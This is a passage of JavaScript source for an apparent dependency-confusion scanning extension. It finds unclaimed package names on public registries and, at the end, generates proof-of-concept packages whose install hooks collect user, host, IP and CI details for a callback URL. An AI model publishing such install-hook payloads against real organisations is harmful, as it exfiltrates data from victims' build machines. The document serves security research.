    // Match [[package]] sections with name = "crate-name"
    const packageMatches = content.matchAll(/\[\[package\]\]\s*\nname\s*=\s*"([^"]+)"/g);
    for (const match of packageMatches) {
      const name = match[1].toLowerCase();
      if (isValidCrateName(name)) {
        packageNames.set(`cargo:${name}`, {
          name,
          type: 'cargo',
          source: sourceUrl,
          codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
          matchLine: 1,
          matchedText: match[0],
          confidence: 100
        });
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from .csproj (NuGet - 100% reliable)
  if (fileType === 'csproj' || fileType === 'fsproj' || fileType === 'vbproj') {
    // Match <PackageReference Include="PackageName" ... />
    const packageRefs = content.matchAll(/<PackageReference\s+Include="([^"]+)"/gi);
    for (const match of packageRefs) {
      const name = match[1];
      if (isValidNuGetPackageName(name)) {
        packageNames.set(`nuget:${name}`, {
          name,
          type: 'nuget',
          source: sourceUrl,
          codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
          matchLine: 1,
          matchedText: match[0],
          confidence: 100
        });
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from packages.config (NuGet - legacy format)
  if (fileType === 'packages.config') {
    // Match <package id="PackageName" ... />
    const packageRefs = content.matchAll(/<package\s+id="([^"]+)"/gi);
    for (const match of packageRefs) {
      const name = match[1];
      if (isValidNuGetPackageName(name)) {
        packageNames.set(`nuget:${name}`, {
          name,
          type: 'nuget',
          source: sourceUrl,
          codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
          matchLine: 1,
          matchedText: match[0],
          confidence: 100
        });
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from pom.xml (Maven - 100% reliable)
  if (fileType === 'pom.xml') {
    // Match <artifactId>artifact-name</artifactId> within <dependency> blocks
    const dependencyBlocks = content.matchAll(/<dependency>[\s\S]*?<\/dependency>/gi);
    for (const block of dependencyBlocks) {
      const artifactMatch = block[0].match(/<artifactId>([^<]+)<\/artifactId>/i);
      const groupMatch = block[0].match(/<groupId>([^<]+)<\/groupId>/i);
      if (artifactMatch) {
        const artifactId = artifactMatch[1];
        const groupId = groupMatch ? groupMatch[1] : '';
        const fullName = groupId ? `${groupId}:${artifactId}` : artifactId;
        if (isValidMavenArtifactName(fullName)) {
          packageNames.set(`maven:${fullName}`, {
            name: fullName,
            type: 'maven',
            source: sourceUrl,
            codeSnippet: [{ lineNumber: 1, content: block[0].substring(0, 100), isMatch: true }],
            matchLine: 1,
            matchedText: block[0].substring(0, 100),
            confidence: 100
          });
        }
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from build.gradle (Gradle/Maven - 100% reliable)
  if (fileType === 'build.gradle' || fileType === 'build.gradle.kts') {
    // Match implementation 'group:artifact:version' or implementation("group:artifact:version")
    const depPatterns = [
      /(?:implementation|api|compile|testImplementation|testCompile)\s*[("']([^'"():]+:[^'"():]+)/gi,
      /(?:implementation|api|compile)\s*\(\s*["']([^'"():]+:[^'"():]+)/gi
    ];

    for (const pattern of depPatterns) {
      const matches = content.matchAll(pattern);
      for (const match of matches) {
        const parts = match[1].split(':');
        if (parts.length >= 2) {
          const fullName = `${parts[0]}:${parts[1]}`;
          if (isValidMavenArtifactName(fullName)) {
            packageNames.set(`maven:${fullName}`, {
              name: fullName,
              type: 'maven',
              source: sourceUrl,
              codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
              matchLine: 1,
              matchedText: match[0],
              confidence: 100
            });
          }
        }
      }
    }
    return Array.from(packageNames.values());
  }

  // Extract from source maps (enhanced parsing)
  if (fileType === 'sourcemap') {
    return extractPackagesFromSourceMap(content, sourceUrl);
  }

  // Only extract npm packages from JavaScript files
  if (fileType === 'javascript') {
    // Skip if content looks like bundled/minified code (high false positive rate)
    if (isBundledOrMinified(content)) {
      console.log(`[Dependency Hunter] Skipping bundled/minified code: ${sourceUrl}`);
      return [];
    }
    // Patterns for npm packages - MORE STRICT to avoid false positives in bundled code
    const npmPatterns = [
      // Only match require() with quotes - STRICT
      { pattern: /\brequire\s*\(\s*['"]([a-z0-9@][a-z0-9-_/]*)['"]\s*\)/gi, isScopedPackage: false },

      // Only match ES6 import statements - STRICT
      { pattern: /\bimport\s+(?:[\w{},\s*]+\s+from\s+)?['"]([a-z0-9@][a-z0-9-_/]*)['"]/gi, isScopedPackage: false },

      // Dynamic imports - STRICT
      { pattern: /\bimport\s*\(\s*['"]([a-z0-9@][a-z0-9-_/]*)['"]\s*\)/gi, isScopedPackage: false },

      // node_modules paths (most reliable)
      { pattern: /\/node_modules\/([a-z0-9][a-z0-9-_]*)\//gi, isScopedPackage: false },

      // Scoped packages in node_modules
      { pattern: /\/node_modules\/@([a-z0-9-]+)\/([a-z0-9-_]+)\//gi, isScopedPackage: true }
    ];

    // Extract npm packages
    for (const patternObj of npmPatterns) {
      let match;
      const pattern = patternObj.pattern;
      while ((match = pattern.exec(content)) !== null) {
        let pkgName;

        // Handle scoped packages (@org/package)
        if (patternObj.isScopedPackage) {
          pkgName = `@${match[1]}/${match[2]}`;
        } else {
          // Extract only the base package name (before first /)
          const fullPath = match[1];
          pkgName = fullPath.split('/')[0];
        }

        if (pkgName && isValidPackageName(pkgName)) {
          const key = `npm:${pkgName}`;
          if (!packageNames.has(key)) {
            // Extract code snippet
            const codeContext = extractCodeSnippet(content, match.index, match[0].length);

            // Calculate confidence based on pattern type
            let confidence = 50; // Base confidence for JS extraction
            if (match[0].includes('node_modules')) confidence = 90; // Very high if from node_modules path
            else if (match[0].includes('require(')) confidence = 70; // High for require()
            else if (match[0].includes('import')) confidence = 70; // High for import

            packageNames.set(key, {
              name: pkgName,
              type: 'npm',
              source: sourceUrl,
              codeSnippet: codeContext.snippet,
              matchLine: codeContext.matchLine,
              matchedText: codeContext.matchedText,
              confidence: confidence
            });
          }
        }
      }
    }
  }

  // Only extract Python packages from Python files
  if (fileType === 'python') {
    // Improved Python patterns - more specific to avoid false positives
    const pythonPatterns = [
      // Match Python import statements at the start of a line
      { pattern: /^import\s+([a-z0-9_]+)(?:\s|$|,|;)/gm },
      { pattern: /^from\s+([a-z0-9_]+)\s+import/gm },
      // Match pip install commands
      { pattern: /pip\s+install\s+([a-z0-9-_]+)/gi },
      // Match requirements.txt style entries
      { pattern: /^([a-z0-9-_]+)==[\d.]+/gm }
    ];

    // Extract Python packages
    for (const patternObj of pythonPatterns) {
      let match;
      const pattern = patternObj.pattern;
      while ((match = pattern.exec(content)) !== null) {
        const pkgName = match[1];
        if (pkgName && isValidPythonPackageName(pkgName)) {
          const key = `pip:${pkgName}`;
          if (!packageNames.has(key)) {
            // Extract code snippet
            const codeContext = extractCodeSnippet(content, match.index, match[0].length);

            // Calculate confidence for Python
            let confidence = 60; // Base confidence for Python code extraction
            if (match[0].includes('pip install')) confidence = 80; // High for pip install
            else if (match[0].match(/==/)) confidence = 80; // High for requirements format

            packageNames.set(key, {
              name: pkgName,
              type: 'pip',
              source: sourceUrl,
              codeSnippet: codeContext.snippet,
              matchLine: codeContext.matchLine,
              matchedText: codeContext.matchedText,
              confidence: confidence
            });
          }
        }
      }
    }
  }

  return Array.from(packageNames.values());
}

// Validate package name (improved)
function isValidPackageName(name) {
  if (!name || typeof name !== 'string') return false;

  // Store original name for pattern matching (case-sensitive)
  const originalName = name.trim();

  // Normalize name for most checks
  name = originalName.toLowerCase();

  // Check length (npm rules) - minimum 3 chars to avoid false positives
  if (name.length < 3 || name.length > 214) return false;

  // Ignore relative imports
  if (name.startsWith('.') || name.startsWith('/')) return false;

  // Ignore URLs
  if (name.startsWith('http') || name.includes('://')) return false;

  // Ignore node: protocol
  if (name.startsWith('node:')) return false;

  // Ignore built-in Node.js modules
  if (NODE_BUILTINS.includes(name)) return false;

  // Ignore common public packages (reduce false positives)
  if (COMMON_PACKAGES.includes(name)) return false;

  // Check if looks like internal bundled module (CamelCase, etc.)
  if (looksLikeInternalModule(originalName)) {
    console.log(`[Dependency Hunter] Skipping internal-looking module: ${originalName}`);
    return false;
  }

  // Check against internal module prefixes
  for (const prefix of INTERNAL_MODULE_PREFIXES) {
    if (name.startsWith(prefix.toLowerCase())) {
      console.log(`[Dependency Hunter] Skipping internal module prefix: ${name}`);
      return false;
    }
  }

  // Check against internal module patterns (use original name for case-sensitive patterns)
  for (const pattern of INTERNAL_MODULE_PATTERNS) {
    if (pattern.test(originalName)) {
      console.log(`[Dependency Hunter] Skipping internal module pattern: ${originalName}`);
      return false;
    }
  }

  // Ignore reserved words and common programming terms
  if (RESERVED_WORDS.includes(name)) {
    console.log(`[Dependency Hunter] Skipping reserved word: ${name}`);
    return false;
  }

  // Ignore CSS properties and HTML attributes
  if (isCssHtmlProperty(name)) {
    console.log(`[Dependency Hunter] Skipping CSS/HTML property: ${name}`);
    return false;
  }

  // Ignore strings that are purely numeric
  if (/^\d+$/.test(name)) {
    console.log(`[Dependency Hunter] Skipping numeric string: ${name}`);
    return false;
  }

  // Ignore very common generic words (one or two letters)
  if (name.length <= 2) {
    console.log(`[Dependency Hunter] Skipping short string: ${name}`);
    return false;
  }

  // Check if it's a scoped package (@org/package)
  if (name.startsWith('@')) {
    // If we're not showing scoped packages, skip
    if (!config.showScopedPackages) {
      console.log(`[Dependency Hunter] Skipping scoped package: ${name}`);
      return false;
    }
    // Validate scoped package format
    return /^@[a-z0-9-]+\/[a-z0-9-_]+$/.test(name);
  }

  // Validate regular package name (npm rules)
  // - lowercase
  // - no leading/trailing spaces
  // - alphanumeric, hyphens, underscores
  // - cannot start with . or _
  if (name.startsWith('.') || name.startsWith('_')) return false;

  // Must match npm package name pattern
  if (!/^[a-z0-9][a-z0-9-_]*$/.test(name)) {
    return false;
  }

  // Additional heuristics to reduce false positives
  // Ignore names that look like file extensions
  const fileExtensions = ['js', 'ts', 'jsx', 'tsx', 'css', 'scss', 'json', 'html', 'xml', 'svg', 'png', 'jpg', 'gif', 'ico', 'woff', 'ttf', 'eot'];
  if (fileExtensions.includes(name)) {
    console.log(`[Dependency Hunter] Skipping file extension: ${name}`);
    return false;
  }

  // In strict mode, require hyphens or underscores (real packages usually have them)
  if (config.strictMode && name.length <= 6 && !name.includes('-') && !name.includes('_')) {
    console.log(`[Dependency Hunter] Strict mode: Skipping short word without separators: ${name}`);
    return false;
  }

  // Require at least one hyphen, underscore, or be longer than 4 chars for single words
  // This helps avoid common words like "call", "test", "load" etc.
  if (name.length <= 4 && !name.includes('-') && !name.includes('_')) {
    console.log(`[Dependency Hunter] Skipping common short word: ${name}`);
    return false;
  }

  return true;
}

function isValidPythonPackageName(name) {
  if (!name || typeof name !== 'string') return false;

  // Normalize
  name = name.trim().toLowerCase();

  // Check length - minimum 3 chars to avoid false positives
  if (name.length < 3 || name.length > 100) return false;

  // Ignore built-in modules
  if (PYTHON_BUILTINS.includes(name)) return false;

  // Ignore reserved words
  if (RESERVED_WORDS.includes(name)) {
    console.log(`[Dependency Hunter] Skipping reserved word (Python): ${name}`);
    return false;
  }

  // Ignore CSS/HTML properties
  if (isCssHtmlProperty(name)) {
    console.log(`[Dependency Hunter] Skipping CSS/HTML property (Python): ${name}`);
    return false;
  }

  // Python package names: lowercase, numbers, underscores
  // Cannot start with number
  if (/^\d/.test(name)) return false;

  // Must match Python package pattern
  if (!/^[a-z][a-z0-9_]*$/.test(name)) {
    return false;
  }

  // Ignore very short names
  if (name.length <= 2) {
    console.log(`[Dependency Hunter] Skipping short Python package: ${name}`);
    return false;
  }

  // Require underscore or be longer than 4 chars
  // This helps avoid common words
  if (name.length <= 4 && !name.includes('_')) {
    console.log(`[Dependency Hunter] Skipping common short word (Python): ${name}`);
    return false;
  }

  return true;
}

// Validate Ruby gem name
function isValidGemName(name) {
  if (!name || typeof name !== 'string') return false;

  name = name.trim().toLowerCase();

  // Check length
  if (name.length < 2 || name.length > 100) return false;

  // Ignore Ruby stdlib
  if (RUBY_STDLIB.includes(name)) return false;

  // Ignore common public gems
  if (COMMON_GEMS.includes(name)) return false;

  // Ignore reserved words
  if (RESERVED_WORDS.includes(name)) return false;

  // Gem names: lowercase, numbers, hyphens, underscores
  if (!/^[a-z][a-z0-9_-]*$/.test(name)) return false;

  return true;
}

// Validate Rust crate name
function isValidCrateName(name) {
  if (!name || typeof name !== 'string') return false;

  name = name.trim().toLowerCase();

  // Check length
  if (name.length < 2 || name.length > 64) return false;

  // Ignore Rust stdlib
  if (RUST_STDLIB.includes(name)) return false;

  // Ignore common public crates
  if (COMMON_CRATES.includes(name)) return false;

  // Ignore reserved words
  if (RESERVED_WORDS.includes(name)) return false;

  // Crate names: alphanumeric, hyphens, underscores (cannot start with hyphen)
  if (!/^[a-z][a-z0-9_-]*$/.test(name)) return false;

  return true;
}

// Validate NuGet package name
function isValidNuGetPackageName(name) {
  if (!name || typeof name !== 'string') return false;

  const originalName = name.trim();
  name = originalName.toLowerCase();

  // Check length
  if (name.length < 2 || name.length > 100) return false;

  // Ignore common public packages (case-insensitive)
  if (COMMON_NUGET.some(pkg => pkg.toLowerCase() === name)) return false;

  // Ignore reserved words
  if (RESERVED_WORDS.includes(name)) return false;

  // NuGet names: alphanumeric, dots, hyphens, underscores
  if (!/^[a-z][a-z0-9._-]*$/i.test(originalName)) return false;

  return true;
}

// Validate Maven artifact name
function isValidMavenArtifactName(name) {
  if (!name || typeof name !== 'string') return false;

  name = name.trim().toLowerCase();

  // Check length
  if (name.length < 2 || name.length > 200) return false;

  // Ignore common public packages
  if (COMMON_MAVEN.some(pkg => name.includes(pkg))) return false;

  // Ignore reserved words
  if (RESERVED_WORDS.includes(name)) return false;

  // Maven artifacts can have groupId:artifactId format
  // Just artifactId: alphanumeric, hyphens, underscores
  if (name.includes(':')) {
    const [groupId, artifactId] = name.split(':');
    if (!/^[a-z][a-z0-9._-]*$/i.test(groupId)) return false;
    if (!/^[a-z][a-z0-9_-]*$/i.test(artifactId)) return false;
  } else {
    if (!/^[a-z][a-z0-9_-]*$/i.test(name)) return false;
  }

  return true;
}

// Enhanced source map parsing to extract package names
function extractPackagesFromSourceMap(content, sourceUrl) {
  const packages = new Map();

  try {
    const sourceMap = JSON.parse(content);

    if (sourceMap.sources && Array.isArray(sourceMap.sources)) {
      for (const source of sourceMap.sources) {
        // Extract from webpack paths like "webpack:///./node_modules/package-name/..."
        const nodeModulesMatch = source.match(/node_modules\/(@?[^\/]+(?:\/[^\/]+)?)/);
        if (nodeModulesMatch) {
          const pkgName = nodeModulesMatch[1];
          if (isValidPackageName(pkgName)) {
            packages.set(`npm:${pkgName}`, {
              name: pkgName,
              type: 'npm',
              source: sourceUrl,
              confidence: 95, // High confidence from source maps
              codeSnippet: [{ lineNumber: 1, content: source, isMatch: true }],
              matchLine: 1,
              matchedText: source
            });
          }
        }

        // Extract from pip/Python paths
        const pythonMatch = source.match(/site-packages\/([a-z][a-z0-9_]*)/i);
        if (pythonMatch) {
          const pkgName = pythonMatch[1].toLowerCase();
          if (isValidPythonPackageName(pkgName)) {
            packages.set(`pip:${pkgName}`, {
              name: pkgName,
              type: 'pip',
              source: sourceUrl,
              confidence: 90,
              codeSnippet: [{ lineNumber: 1, content: source, isMatch: true }],
              matchLine: 1,
              matchedText: source
            });
          }
        }
      }
    }

    // Also check sourcesContent for more package references
    if (sourceMap.sourcesContent && Array.isArray(sourceMap.sourcesContent)) {
      sourceMap.sourcesContent.forEach((sourceContent, idx) => {
        if (typeof sourceContent === 'string') {
          // Look for require/import statements
          const requireMatches = sourceContent.matchAll(/require\s*\(\s*['"]([a-z0-9@][a-z0-9-_/]*)['"]\s*\)/gi);
          for (const match of requireMatches) {
            const pkgName = match[1].split('/')[0];
            if (isValidPackageName(pkgName) && !packages.has(`npm:${pkgName}`)) {
              packages.set(`npm:${pkgName}`, {
                name: pkgName,
                type: 'npm',
                source: sourceUrl,
                confidence: 85,
                codeSnippet: [{ lineNumber: 1, content: match[0], isMatch: true }],
                matchLine: 1,
                matchedText: match[0]
              });
            }
          }
        }
      });
    }
  } catch (e) {
    console.debug(`[Dependency Hunter] Error parsing source map: ${e.message}`);
  }

  return Array.from(packages.values());
}

// Fetch with timeout helper function
async function fetchWithTimeout(url, options = {}, timeout = 10000) {
  const controller = new AbortController();
  const timeoutId = setTimeout(() => controller.abort(), timeout);

  try {
    const response = await fetch(url, {
      ...options,
      signal: controller.signal
    });
    clearTimeout(timeoutId);
    return response;
  } catch (error) {
    clearTimeout(timeoutId);
    if (error.name === 'AbortError') {
      throw new Error(`Request timeout after ${timeout}ms`);
    }
    throw error;
  }
}

// Check if package exists in registry (with rate limiting)
async function checkPackageExists(pkg, sourceUrl, tabId) {
  try {
    // Check if already processed this package
    const packageKey = `${pkg.type}:${pkg.name}`;
    if (checkedPackages.has(packageKey)) {
      return;
    }
    checkedPackages.add(packageKey);

    // Use rate limiter to prevent IP blocking
    await rateLimiter.add(async () => {
      await performPackageCheck(pkg, sourceUrl, tabId);
    });
  } catch (error) {
    console.error(`[Dependency Hunter] Error checking package ${pkg.name}:`, error);
  }
}

// Perform the actual package check
async function performPackageCheck(pkg, sourceUrl, tabId) {
  let exists = false;
  let registryUrl = '';

  if (pkg.type === 'npm') {
    // Use configured npm registry or default
    const npmRegistry = config.npmRegistry || 'https://registry.npmjs.org';
    registryUrl = `${npmRegistry}/${pkg.name}`;

    // Prepare headers
    const headers = {};

    // Add npm authentication if enabled and token is set
    if (config.npmAuthEnabled && config.npmToken) {
      headers['Authorization'] = `Bearer ${config.npmToken}`;
    }

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'HEAD',
        headers: headers
      }, 10000);
      exists = response.status === 200;

      // If unauthorized but we have a token, package might exist in private registry
      if (response.status === 401 && config.npmAuthEnabled) {
        console.log(`[Dependency Hunter] Package ${pkg.name} requires authentication`);
        return; // Skip this package as it's likely private
      }
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check npm package ${pkg.name}: ${fetchError.message}`);
      // On network error, assume package exists to avoid false positives
      return;
    }
  } else if (pkg.type === 'pip') {
    registryUrl = `https://pypi.org/pypi/${pkg.name}/json`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'HEAD'
      }, 10000);
      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check pip package ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'gem' && config.enableRubyGems) {
    // RubyGems registry check
    registryUrl = `https://rubygems.org/api/v1/gems/${pkg.name}.json`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET', // RubyGems API doesn't support HEAD well
        headers: { 'Accept': 'application/json' }
      }, 10000);
      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check gem ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'cargo' && config.enableCargo) {
    // Crates.io registry check
    registryUrl = `https://crates.io/api/v1/crates/${pkg.name}`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'dependency-confusion-hunter/1.2.0'
        }
      }, 10000);
      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check crate ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'nuget' && config.enableNuGet) {
    // NuGet registry check
    registryUrl = `https://api.nuget.org/v3/registration5-semver1/${pkg.name.toLowerCase()}/index.json`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      }, 10000);
      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check NuGet package ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'maven' && config.enableMaven) {
    // Maven Central check (using search API)
    const [groupId, artifactId] = pkg.name.includes(':') ? pkg.name.split(':') : ['', pkg.name];
    registryUrl = `https://search.maven.org/solrsearch/select?q=a:${artifactId}&rows=1&wt=json`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET',
        headers: { 'Accept': 'application/json' }
      }, 10000);

      if (response.status === 200) {
        const data = await response.json();
        exists = data.response && data.response.numFound > 0;
      }
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check Maven artifact ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'go' && config.enableGo) {
    // Go modules check (pkg.go.dev / proxy.golang.org)
    // Use proxy.golang.org for existence check
    const modulePath = pkg.name.replace(/\//g, '/');
    registryUrl = `https://proxy.golang.org/${modulePath}/@v/list`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET',
        headers: {
          'Accept': 'text/plain',
          'User-Agent': 'dependency-confusion-hunter/1.3.0'
        }
      }, 10000);

      // 200 means module exists, 404/410 means it doesn't
      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check Go module ${pkg.name}: ${fetchError.message}`);
      return;
    }
  } else if (pkg.type === 'composer' && config.enableComposer) {
    // Packagist.org (PHP Composer) check
    registryUrl = `https://repo.packagist.org/p2/${pkg.name}.json`;

    try {
      const response = await fetchWithTimeout(registryUrl, {
        method: 'GET',
        headers: {
          'Accept': 'application/json',
          'User-Agent': 'dependency-confusion-hunter/1.3.0'
        }
      }, 10000);

      exists = response.status === 200;
    } catch (fetchError) {
      console.warn(`[Dependency Hunter] Failed to check Composer package ${pkg.name}: ${fetchError.message}`);
      return;
    }
  }

  if (!exists) {
      // Double-check with GET request to reduce false positives
      const doubleCheck = await verifyPackageDoesNotExist(pkg, registryUrl);

      if (!doubleCheck) {
        console.log(`[Dependency Hunter] Package ${pkg.name} exists after double-check`);
        return;
      }

      // Calculate final confidence score
      let confidence = pkg.confidence || 50;

      // Boost confidence for manifest/lock file sources
      if (sourceUrl.includes('package.json') || sourceUrl.includes('package-lock.json') ||
          sourceUrl.includes('yarn.lock') || sourceUrl.includes('requirements.txt') ||
          sourceUrl.includes('go.mod') || sourceUrl.includes('go.sum') ||
          sourceUrl.includes('composer.json') || sourceUrl.includes('composer.lock') ||
          sourceUrl.includes('Gemfile') || sourceUrl.includes('Gemfile.lock') ||
          sourceUrl.includes('Cargo.toml') || sourceUrl.includes('Cargo.lock')) {
        confidence = 100;
      }

      // Reduce confidence for generic short names
      if (pkg.name.length < 6 && !pkg.name.includes('-')) {
        confidence = Math.max(30, confidence - 20);
      }

      // Boost confidence for names with hyphens (typical npm pattern)
      if (pkg.name.includes('-') && pkg.name.length > 8) {
        confidence = Math.min(95, confidence + 10);
      }

      // Skip if below minimum confidence threshold
      if (confidence < config.minConfidence) {
        console.log(`[Dependency Hunter] Skipping ${pkg.name} (confidence ${confidence}% < ${config.minConfidence}%)`);
        return;
      }

      // Vulnerability found!
      const finding = {
        id: Date.now() + Math.random(),
        package: pkg.name,
        type: pkg.type,
        source: sourceUrl,
        timestamp: new Date().toISOString(),
        tabId: tabId,
        registryUrl: registryUrl,
        status: 'vulnerable',
        verified: true,
        firstSeen: new Date().toISOString(),
        codeSnippet: pkg.codeSnippet || [],
        matchLine: pkg.matchLine || 0,
        matchedText: pkg.matchedText || '',
        confidence: confidence
      };

      await saveFinding(finding);

      // Add to history if enabled
      if (config.enableHistory) {
        await addToHistory(finding);
      }

      // Send notification
      if (config.notificationsEnabled) {
        await sendNotification(finding);
      }

      // Send to Discord
      if (config.discordWebhook) {
        await sendToDiscord(finding);
      }

      // Update badge
      updateBadge();
    } else {
      console.log(`[Dependency Hunter] Package ${pkg.name} exists in registry`);
    }
}

// Double-check package existence with GET request
async function verifyPackageDoesNotExist(pkg, registryUrl) {
  try {
    const headers = {};

    if (pkg.type === 'npm' && config.npmAuthEnabled && config.npmToken) {
      headers['Authorization'] = `Bearer ${config.npmToken}`;
    }

    const response = await fetchWithTimeout(registryUrl, {
      method: 'GET',
      headers: headers
    }, 10000);

    // If 200 or 304, package exists
    if (response.status === 200 || response.status === 304) {
      return false;
    }

    // If 404, package doesn't exist
    if (response.status === 404) {
      return true;
    }

    // For other status codes, try to parse response
    if (response.status === 401 || response.status === 403) {
      // Might be private package, log and skip
      console.log(`[Dependency Hunter] Package ${pkg.name} might be private (${response.status})`);
      return false;
    }

    // Unknown status, assume exists to avoid false positive
    console.warn(`[Dependency Hunter] Unknown status ${response.status} for ${pkg.name}`);
    return false;

  } catch (error) {
    // Network error, assume exists to avoid false positive
    console.warn(`[Dependency Hunter] Verification error for ${pkg.name}:`, error.message);
    return false;
  }
}

// Save finding to storage
async function saveFinding(finding) {
  // Check if already exists (deduplicate)
  const exists = findings.some(f => f.package === finding.package && f.type === finding.type);

  if (!exists) {
    findings.push(finding);
    await chrome.storage.local.set({ findings: findings });
  }
}

// Add finding to history
async function addToHistory(finding) {
  const historyEntry = {
    ...finding,
    sessionId: Date.now(),
    url: finding.source,
    detectedAt: new Date().toISOString()
  };

  history.push(historyEntry);

  // Keep only last 100 entries
  if (history.length > 100) {
    history = history.slice(-100);
  }

  await chrome.storage.local.set({ history: history });
}

// Send notification
async function sendNotification(finding) {
  chrome.notifications.create({
    type: 'basic',
    iconUrl: 'icons/icon128.png',
    title: 'Dependency Confusion Found!',
    message: `Package "${finding.package}" (${finding.type}) does not exist publicly!`,
    priority: 2
  });
}

// Test Discord webhook connection
async function testDiscordWebhook(webhookUrl) {
  if (!webhookUrl) {
    throw new Error('Webhook URL is required');
  }

  const embed = {
    embeds: [{
      title: '🧪 Dependency Confusion Hunter - Test',
      description: 'Discord Webhook connection test successful!',
      color: 0x00ff00,
      fields: [
        { name: 'Status', value: '✅ Connected', inline: true },
        { name: 'Extension Version', value: '1.3.0', inline: true },
        { name: 'Timestamp', value: new Date().toISOString(), inline: false }
      ],
      footer: {
        text: 'Dependency Confusion Hunter by OFJAAAH'
      }
    }]
  };

  const response = await fetch(webhookUrl, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(embed)
  });

  if (!response.ok && response.status !== 204) {
    throw new Error(`Discord webhook test failed: ${response.status}`);
  }

  return true;
}

// Send to Discord webhook
async function sendToDiscord(finding) {
  if (!config.discordWebhook) return;

  try {
    const embed = {
      embeds: [{
        title: '🎯 Dependency Confusion Vulnerability',
        color: 0xff0000,
        fields: [
          { name: 'Package', value: finding.package, inline: true },
          { name: 'Type', value: finding.type.toUpperCase(), inline: true },
          { name: 'Status', value: '❌ Not Found', inline: true },
          { name: 'Source', value: finding.source },
          { name: 'Registry Checked', value: finding.registryUrl },
          { name: 'Timestamp', value: finding.timestamp }
        ],
        footer: {
          text: 'Dependency Confusion Hunter by OFJAAAH'
        }
      }]
    };

    await fetch(config.discordWebhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embed)
    });
  } catch (error) {
    console.error('Error sending to Discord:', error);
  }
}

// =====================================================
// POC PACKAGE GENERATION
// =====================================================

// Generate PoC package content with callback
function generatePoCPackageContent(packageName, callbackUrl, discordWebhook) {
  const timestamp = new Date().toISOString();

  // Get Discord webhook from config if not provided
  const webhookUrl = discordWebhook || config.discordWebhook || '';

  // Package.json
  const packageJson = {
    name: packageName,
    version: '999.0.0',
    description: `Security research PoC - Dependency Confusion Hunter by OFJAAAH`,
    main: 'index.js',
    scripts: {
      preinstall: 'node callback.js',
      postinstall: 'node callback.js'
    },
    keywords: ['security', 'research', 'poc'],
    author: 'OFJAAAH - Security Research',
    license: 'MIT'
  };

  // Callback script - Enhanced payload for PoC
  const callbackScript = `#!/usr/bin/env node
/**
 * Dependency Confusion PoC Callback
 * Author: OFJAAAH
 * Generated: ${timestamp}
 *
 * This script sends a callback to verify package installation
 * Collects: IP, User, Directory, Hostname for proof of concept
 * FOR AUTHORIZED SECURITY TESTING ONLY
 */

const https = require('https');
const http = require('http');
const os = require('os');
const { execSync } = require('child_process');

const CALLBACK_URL = '${callbackUrl || 'https://YOUR_CALLBACK_URL'}';
const DISCORD_WEBHOOK = '${webhookUrl}';
const PACKAGE_NAME = '${packageName}';

// Get network interfaces to find IP
function getLocalIP() {
  try {
    const interfaces = os.networkInterfaces();
    for (const name of Object.keys(interfaces)) {
      for (const iface of interfaces[name]) {
        if (iface.family === 'IPv4' && !iface.internal) {
          return iface.address;
        }
      }
    }
  } catch (e) {}
  return 'unknown';
}

// Get external IP (optional - may fail in restricted networks)
async function getExternalIP() {
  return new Promise((resolve) => {
    https.get('https://api.ipify.org?format=json', { timeout: 3000 }, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(data).ip);
        } catch (e) {
          resolve(null);
        }
      });
    }).on('error', () => resolve(null));
  });
}

// Collect system info
function collectSystemInfo() {
  const info = {
    // Package info
    package: PACKAGE_NAME,
    timestamp: new Date().toISOString(),

    // User info
    user: os.userInfo().username,
    uid: os.userInfo().uid,
    gid: os.userInfo().gid,
    homedir: os.userInfo().homedir,
    shell: os.userInfo().shell,

    // System info
    hostname: os.hostname(),
    platform: os.platform(),
    arch: os.arch(),
    release: os.release(),
    type: os.type(),

    // Directory info
    cwd: process.cwd(),

    // Network info
    localIP: getLocalIP(),

    // Node info
    nodeVersion: process.version,
    npmVersion: process.env.npm_package_version || 'unknown',

    // CI/CD Detection
    isCI: !!(process.env.CI || process.env.GITHUB_ACTIONS || process.env.GITLAB_CI || process.env.JENKINS_URL || process.env.TRAVIS || process.env.CIRCLECI || process.env.BUILDKITE),
    ciEnvironment: detectCIEnvironment(),

    // NPM info
    npmLifecycle: process.env.npm_lifecycle_event || '',
    npmPackageName: process.env.npm_package_name || '',

    // Additional context
    env: {
      CI: process.env.CI || '',
      GITHUB_ACTIONS: process.env.GITHUB_ACTIONS || '',
      GITHUB_REPOSITORY: process.env.GITHUB_REPOSITORY || '',
